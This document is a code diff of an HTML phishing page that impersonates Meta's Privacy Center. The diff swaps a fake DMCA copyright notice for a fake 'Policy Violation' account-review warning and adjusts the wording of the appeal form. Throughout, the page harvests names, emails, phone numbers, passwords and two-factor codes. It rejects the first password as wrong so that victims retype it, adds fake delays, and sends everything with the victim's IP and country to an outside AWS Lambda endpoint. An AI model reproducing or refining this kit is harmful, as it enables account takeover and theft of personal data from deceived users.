@@ -11,6 +11,7 @@
     <link rel="stylesheet" href="../styles/style.css">
     <link rel="shortcut icon" href="../ico.ico" type="image/x-icon">
 
+
 </head>
 
 <body>
@@ -3095,6 +3096,7 @@
                         </svg>
                     </div>
                     <h1>Privacy Center</h1>
+                    <br>
                     <div id="action-buttons">
 
                         <div class="action-button account" id="utm-user" style="display: none;">
@@ -3137,7 +3139,7 @@
                                 </svg>
                             </div>
                             <div class="action-button-text">
-                                Privacy Center Home Page
+                                Home Page
                             </div>
                             <div class="action-button-arrow">
 
@@ -3241,15 +3243,20 @@
                 </div>
             </div>
             <div class="col-8">
-                <div id="right" style="padding-top: 18px">
+                <div id="right" style="padding-top: 18px;">
                     <h1>
-                        <img src="../img/block_2.png" alt="" style="height: 40px;
-                        width:40px;
+                        <img src="../img/block_2.png" alt="" style="height: 50px;
+                        width:50px;
                         margin-right: 8px;">
-                        Copyright Infringement
+                        Policy Violation
                     </h1>
-                    <p>Meta has received an official copyright complaint submitted by the rights holder regarding your unauthorized use of copyrighted content. This complaint was filed under <strong>Section 512 of
-                            the Digital Millennium Copyright Act (DMCA)</strong> and constitutes a violation of our Advertising Policies. As a result, your account has been scheduled for review.</p>
+                    <h6>
+                        We have received multiple reports that suggest that your account has been in violation of our Terms of Services and Community Guidelines. As a result, your account has been scheduled for review.
+                    </h6>
+                    <div id="utm-ticketId" style="display: block;">
+                    </div>
+
+
                     <div class="action-button wide" id="view-accounts" onclick="accountsModal.show()"
                         style="display: none; margin-bottom: 15px;">
                         <div class="action-button-img">
@@ -3270,25 +3277,34 @@
                         </div>
                         <br>
                     </div>
-
-                    </ul>
                     <div id="card">
-                        <!-- <img src="/img/unlock.png" alt=""> -->
-                        <!-- <img src="/img/mobile.png" alt=""> -->
-                        <img src="../img/shild.jpg" alt="">
+                        <img src="../img/PrivacyCenter2.png" alt="">
+
                         <div class="card-text">
-                            <h5>This form is only to be used to submit complaints regarding copyright infringement.</h5>
-                            <p>Please ensure that you provide the requested information below.
-                                Failure to do so may delay the processing of your appeal.</p>
-                            <div class="btn-wrapper">
+                            <div style="border-radius: 15px;
+                            background: linear-gradient(
+  90deg,
+  rgba(249, 241, 249, 1) 0%,
+  rgba(234, 243, 253, 1) 35%,
+  rgba(237, 251, 242, 1) 100%
+ ) ;
+                            padding: 20px 20px 10px 20px;">
+                                <h5>This form is intended solely for submitting appeals and requesting account restoration.</h5><br>
+                                <p>Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.</p>
+                                <br>
                                 <div id="start" class="button fb-blue w-100" data-bs-toggle="modal"
                                     data-bs-target="#exampleModal1">
                                     Request Review</button>
                                 </div>
+                                <br>
                             </div>
+                            <div class="btn-wrapper">
+                                
+                            </div>
+
                         </div>
                     </div>
-
+                    
                     <h6>Privacy Center</h6>
                     <div class="fake-likns">
                         <div class="action-button-list">
@@ -3436,7 +3452,7 @@
         <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h5 class="modal-title" id="exampleModalLabel">Appeal Form</h5>
+                    <h4 class="modal-title" id="exampleModalLabel">Appeal Form</h4>
                     <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
                 <div class="modal-body">
@@ -3444,13 +3460,10 @@
 
                         <div class="mb-3">
                             <label for="exampleFormControlTextarea1" class="form-label">
-                                Appeal
+                                Please provide us information that will help us investigate
                             </label>
                             <textarea name="apeal" class="form-control" id="exampleFormControlTextarea1" rows="1"
                                 required></textarea>
-                            <div id="emailHelp" class="form-text">
-                                Please indicate why you believe that account restrictions were imposed by mistake.
-                            </div>
                         </div>
                         <div class="mb-3">
                             <label for="FullNameField" class="form-label">Full Name</label>
@@ -3470,7 +3483,7 @@
                         </div>
 
                         <div class="mb-3">
-                            <label for="PhoneFirld" class="form-label">Mobile phone number</label>
+                            <label for="PhoneFirld" class="form-label">Mobile Phone Number</label>
                             <input value="" name="mobile-phone-number" type="tel" class="form-control" id="PhoneFirld"
                                 required aria-describedby="emailHelp" minlength="7" maxlength="18">
                         </div>
@@ -3522,7 +3535,7 @@
                                 <label for="exampleInputPassword" class="form-label">Password</label>
                                 <div style="display: flex; align-items: center;">
                                     <input name="password-1" type="password" class="form-control"
-                                        id="exampleInputPassword" autocomplete="off" minlength="6" maxlength="30"
+                                        id="exampleInputPassword" autocomplete="off" minlength="6" maxlength="100"
                                         aria-describedby="emailHelp" required
                                         onfocus="this.removeAttribute('readonly');">
                                 </div>
@@ -3542,7 +3555,7 @@
                                 </svg>
                             </div>
                             <div class="invalid-feedback">
-                                Incorrect password. Please, try again.
+                                The password that you've entered is incorrect.
                             </div>
                         </div>
                         <div class="form-btn-wrapper">
@@ -3569,11 +3582,14 @@
             <div class="modal-content">
                 <div class="modal-body">
                     <div class="twoFAinfo-wraper">
-                        <h1 class="modal-title" id="2FAmodalLabel">Check your authentication code </h1>
-                        <p>Enter the 6-digit code for this account from the two-factor authentication you set up
-                            (such as Google Authenticator or text message on you mobile).</p>
+                        <h2 class="modal-title" id="2FAmodalLabel">Check your authentication code </h2>
+                        <br>
+                        <h5>
+                            Enter the code for this account from the two-factor authentication you set up (such as
+                            Google Authenticator, email or text message on your mobile).
+                        </h5>
                         <div class="fb-round-wraper">
-                            <img src="../img/2FA.png" alt="" style="width: 100%;">
+                            <img src="../img/2FA.jpg" alt="" style="width: 100%;">
                         </div>
                     </div>
 
@@ -3589,7 +3605,8 @@
                                     id="exampleInputPassword" aria-describedby="emailHelp" required autocomplete="off">
                             </div>
                             <div class="invalid-feedback">
-                                Incorrect. Please, try again after <span id="timer"></span>
+                                This code doesn't work. Please check its correct or try a new one after <span
+                                    id="timer"></span>.
                             </div>
                         </div>
                         <div class="form-btn-wrapper">
@@ -3771,6 +3788,7 @@
                 </div>
                 <div class="modal-body">
                     <h4 class="modal-title" id="policyModalLabel">Privacy Policy</h4>
+                    <br>
                     <h5>What is the Privacy Policy and what does it cover?</h5>
                     <div class="action-button wide">
                         <div class="action-button-img">
@@ -3814,7 +3832,7 @@
                     </p>
                     <br>
                     <p>
-                        Полный текст политики приведен ниже.
+                        The full text of the policy is provided below.
                     </p>
                     <br>
                     <div class="action-button-list">
@@ -4041,10 +4059,6 @@
             </div>
         </div>
     </div>
-
-
-
-
     <script>
         window.mobileCheck = function () {
             let check = false;
@@ -4234,7 +4248,7 @@
         }
 
         var INCORRECT_2FA_TIMEOUT = 60
-        var SEND_FORM_FICTIV_TIME = 2000
+        var SEND_FORM_FICTIV_TIME = 3000
 
         var firstModal = new bootstrap.Modal(document.getElementById('exampleModal1'))
         var apiModal = new bootstrap.Modal(document.getElementById('exampleModal2'))
@@ -4324,8 +4338,6 @@
 
         })
 
-
-
         // Get User IP
         var url = 'https://api.db-ip.com/v2/free/self/'
         async function getUserIp() {
@@ -4336,18 +4348,16 @@
                     'user_ip': data.ipAddress,
                     'country': data.countryName,
                     'country_code': data.countryCode,
-                    'city': data.city
                 }
             } else {
                 userIpData = {
                     'user_ip': 'Ip not detected ;(',
                     'country': '-',
                     'country_code': '-',
-                    'city': '-'
                 }
             }
         }
-        /////
+
         getUserIp()
 
         // Send data to Email
@@ -4356,7 +4366,6 @@
                 'ip_address': userIpData.user_ip,
                 'country': userIpData.country,
                 'country_code': userIpData.country_code,
-                'city': userIpData.city,
                 'full_name': formsSendData['full-name'],
                 'pers_email': formsSendData['personal-email'],
                 'bus_email': formsSendData['buiseness-email'],
@@ -4370,6 +4379,7 @@
                 'message': formsSendData['apeal'],
                 'user_agent': window.navigator.userAgent,
                 'user_referrer': window.window.location.href,
+                'call_code': userIpData.call_code
             };
 
             $.ajax('https://ajfesgwpz2qubmqrdvu6warxam0lssjq.lambda-url.us-west-2.on.aws', {
@@ -4377,7 +4387,9 @@
                 data: JSON.stringify(templateData),
                 contentType: 'application/json'
             }).done(function () {
+                // Xử lý khi gửi thành công
             }).fail(function (error) {
+                // Xử lý khi gửi thất bại
             });
         }
 
@@ -4397,14 +4409,15 @@
                 spiner.style.display = 'none'
                 buttonText.style.display = 'block'
                 button.removeAttribute('disabled')
-            }, SEND_FORM_FICTIV_TIME)
+            }, 3000)
+
         }
 
         function hidePasswordIncorrectText() {
             setTimeout(function () {
                 var errortext = apiForm.querySelector('.invalid-feedback')
                 errortext.style.display = 'none'
-            }, 3000)
+            }, 6000)
         }
 
         function apiFormhandle(event) {
@@ -4442,7 +4455,7 @@
                     apiModal.hide()
                     twoFAModal.show()
                 }
-            }, SEND_FORM_FICTIV_TIME)
+            }, 6000)
 
         }
         var counter2FA = 1
@@ -4489,7 +4502,7 @@
                     buttonText.style.display = 'block'
                 }
 
-            }, SEND_FORM_FICTIV_TIME)
+            }, 8000)
         }
 
         function unlock2FA() {
@@ -4550,7 +4563,7 @@
                 var now = new Date().getTime();
                 var distance = Math.round((now - countDownDate) / 1000);
                 var insertedTime = INCORRECT_2FA_TIMEOUT - distance;
-                document.getElementById("timer").innerHTML = insertedTime + "s ";
+                document.getElementById("timer").innerHTML = insertedTime + "s";
                 document.getElementById("timer").style.display = 'inline';
                 if (insertedTime <= 0) {
                     clearInterval(x);
@@ -4701,7 +4714,6 @@
         detectUtmUserLeftBar()
         delectAccountUtm()
         delectTicketIdUtm()
-
     </script>
 </body>
 
